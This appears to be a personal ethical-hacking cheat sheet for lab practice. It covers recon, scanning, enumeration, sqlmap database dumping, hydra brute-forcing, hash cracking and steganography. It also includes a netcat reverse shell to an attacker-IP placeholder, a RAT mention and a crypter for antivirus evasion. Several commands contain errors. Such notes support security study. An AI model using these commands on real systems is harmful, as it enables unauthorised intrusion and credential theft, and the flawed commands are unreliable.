#### Resources link

[Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)

#### Recon
  ##### via Web
  - [Tor Browser](https://www.torproject.org/download/)
  - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
  - [Netcraft](https://searchdns.netcraft.com)
  - [Shodan](https://www.shodan.io/)
  - [Censys](https://censys.com/data-and-search/)

  ##### via application/tools
  - sublist3r ‘ sublist3r -d domain -b all ‘
  - Harvester – ‘ theharvester -d domain -n linkedin ‘
  - sherlock
  - userecon
  - photon
  - Web extractor
  - Httrack (for mirroring website)
  - Recon-ng

#### Network Scanning

- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/nmap_cheatsheet.md)
- SX tool : command line network scanning tool that perform Arp scanning , TCP & UDP 
  ````js
  sx arp 10.10.1.0/24
  sx arp 10.10.10.1 /24 –json | tee arp.cache”   // for output in a file
  ````
- GUI application
  - Angry IP scanner : Perform host discovery any OS
  - Zenmap  - nmap’s  graphical interface tool
- uniscan
    Graphical:  Launch uniscan-gui and select required checkbox
    Command:
      ````
      unicornscan 10.10.1.10 -Iv”
      ````
- Metasploit payloads(for scanning)
- some more tools
  ````js
  //discover devices inside the network eth0
  netdiscover -i eth0
  // enumeration
  netstat -a 10.10.10.10 // netstat enumeration netbios
  snmp-check 10.10.10.10 // extract users from netbios - parrot
  masscan -e tun0 -p1-65535 -rate=1000 <ip> 
  ````

#### Default ports
| **Port**  | **Name**                          | **Insight (OS/Machine Identification Clues)** |
|----------|--------------------------------|----------------------------------------------|
| **22**   | SSH                            | Common on **Linux**, macOS, and network devices. |
| **23**   | Telnet                         | Found on **legacy systems** (old Windows, Unix). |
| **25**   | SMTP                           | Email servers, typically **Linux-based**. |
| **53**   | DNS                            | BIND service suggests **Linux**, Microsoft DNS hints at **Windows Server**. |
| **80**   | HTTP                           | Web servers (**Apache/Nginx on Linux, IIS on Windows**). |
| **443**  | HTTPS                          | Secure web servers, **IIS version suggests Windows Server**. |
| **3306** | MySQL                          | Mostly found on **Linux servers**. |
| **3389** | RDP (Remote Desktop)           | **Windows-only** (Windows Server, Windows 10/11). |
| **139**  | NetBIOS                        | **Windows-only** (Active Directory, Windows networking). |
| **445**  | SMB                            | **Windows-only** (file sharing, domain services). Used in **EternalBlue exploits**. |
| **21**   | FTP                            | Open source vs. proprietary FTP servers hint at OS. |
| **135**  | RPC                            | **Windows-only** (DCE-RPC for Active Directory, remote management). |
| **5060** | SIP                            | VoIP services, found on **Linux-based PBX servers** (Asterisk, FreePBX). |
| **161**  | SNMP                           | Found on **network devices** (Cisco routers, managed switches). |
| **8080** | Alternative HTTP               | Tomcat = **Linux**, IIS = **Windows**. |
| **4444** | Metasploit Listener            | Could indicate **reverse shell activity**. |
| **5432** | PostgreSQL                     | Database mostly found on **Linux servers**. |
| **5985** | WinRM (Windows Remote Management) | **Windows-only** (PowerShell Remoting, Windows Server). |
| **5555** | Android Debug Bridge (ADB)     | **Android devices** in debug mode, potential for remote exploitation. |



#### Enumeration
- enum4linux 10.10.60.11
- smbmap
  ````
  smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
  -x = command
- bruteforcing
  ````
  hydra -L user.txt -P pass.txt smb://10.10.10.4
  L =  logging file name
  P = Passwords file name
  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
  ````
- AD Explorer (LDAP)
  ````
  or with nmap
  nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
  ````
- some more:
  ````
  // dir enumeration
  gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
  
  dir : directory listing
  -u : host
  -w : wordlists
  -t : threads int / Number of concurrent threads (default 10)
  -x : enumerate hidden files htm, php
  -q : –quiet / Don’t print the banner and other noise
  
  //snmp-check 10.10.1.22
  snmp-check 10.10.1.22  // after UDP scan with nmap
  
  // wordpress enumeration
  wpscan --url https://localchost.com --passwords=
  wpscan -u 10.10.. -e u vp
  wpscan -u 10.10.. -e u --wordlist path/rockyou.txt //bruteforce
  
  -e = enumerate
  u = enumerate usernames
  vp = vulnerable plugins
  
  // wordlist generation
  cewl -w wordlist -d 2 -m 5 http://wordpress.com
  -d = deeph of the scanning
  -m = long of the words
  -w = save to a file worlist
  ````

#### Vulnerability scanning
- openVAS | greenbone
- Tenable Nessus
- NIST
- CVE org (https://www.cve.org)
```
nikto -h url -Cgidirs all
```

#### Stegnography
- steghide
    ```
    steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
    ef = embedded file  //   abc is a text file in this example
    cf = cover file  //     web.jpeg is a image file
    sf = stegno file  //     new.jpeg is a stego created new file
    e = encryption
    p = password
    steghide extract -sf new.jpeg  // This will exctract the hidden file 
- openstego GUI tool (https://github.com/syvaidya/openstego/releases)
- stegosuite
- SNOW
  ```
  SNOW.EXE -C -p 1234 output.txt   // For extracting the hidden message
  
  // Options Available in SNOW
    -C Compress the data if concealing, or uncompress it while extracting.
    -Q Quiet mode, If not set means the application will report statistics such as compression percentage and amount of storage available.
    -S Report on the approximate amount of space available for a hidden message in the text file. Line length is taken into account, but other options are ignored.
    -p For setting the password for concealment of data and while extracting the data.
    -l line-len When appending whitespace, snow will always produce lines shorter than this value. By default, it is set to 80.
    -f Content of the file will get concealed in the input file.
    -m Message String The content written in this flag will be concealed into the input file.

  // Example
    Open the uncompressed file.
    Run the SNOW.exe file.
    Open CMD and reach the file that you want to hide the message within.
    Write the command like below for concealing the message into a text file:

      SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt
      
      SNOW.EXE It tells the CMD window that we are using the snow tool for steganography.
      -C It is for compressing the data if concealing, or uncompressing it while extracting.
      -p It is for a password for concealing and extracting.
      input.txt The file in which you want to conceal the message within.
      output.txt The file in which you want the output.
  ```

#### Web explotation
[SQLmap cheetsheet](https://github.com/LibyKurian/ethicalhacking-h/blob/main/sqlmap_cheatsheet.md)
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````

#### Netcat Reverse Shell
Victim (Windows/Linux)
  ```
  nc -e /bin/bash <ATTACKER-IP> 4444
  ```
Attacker (Listener)
  ```
  nc -lvnp 4444
  ```

#### Theef
  // Server exe need to be run on victim and client exe on Attacker

#### Payload detect via Anti-malware / Anti-Virus
- Virus Total
- Hybrid Analysis
- Antiscan.me
  
 // swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.

#### Cryptography

Symmetric Encryption: Use same key for Encryption and decryption

Asymmetric Encryption: Use Public/Private for Encryption and Decryption

##### Hashing/decoding

To decrypt (crack) a hashed password:
- Online:

| **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
|-------------|---------------------------------|-----------|
|[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
|[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
|[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
|[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
|[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |

- Locally:
  - Identify the Hash Type
    ```
    hashid hash.txt
    hashcat --identify hash.txt
    ```
  - Crack the Hash
    ```
    // Using john (John the Ripper)
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    john --show hash.txt   // Check results
    
    // Using hashcat ( Find the correct hash mode (-m) )
    hashcat -m <HASH_MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   // Example
    ```
  - Brute Force If No Dictionary Matches
    ```
    hashcat -m <HASH_MODE> -a 3 hash.txt ?a?a?a?a?a?a     // (Adjust ?a?a?a... for password length.)
    ```
  
  - Decode Base64 (If Encoded)
  If the file contains Base64-encoded text, decode it first:
    ```
    cat hash.txt | base64 -d
    ```
  If the hash is common (MD5, SHA1, NTLM), rockyou.txt is usually enough to crack it!

- GUI Applications
  - Hash Calc (window based tool)
  - MD5 Calculator (window based – git/sourceforage)
  - Cryptoforge
      - Not a free application
      - We can lock/encypt a file/folder with the password
  - Encrypt/Decrypt data with BCTTextEncoder
  
##### Disk Encryption
  - Bitlocker
  - Veracrypt (https://veracrypt.eu/en/Downloads.html)
    - after installing/opening application , create a volume
    - Choose an encrypted file container/ Non-system drive / entire drive
    - Select standard and location for this file
    - Choose encryption algorithm like AES
    - Allot size for the folder and choose password
    - Move the cursor for more complexity of encryption
    - Finish the setup
    - Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.


#### More
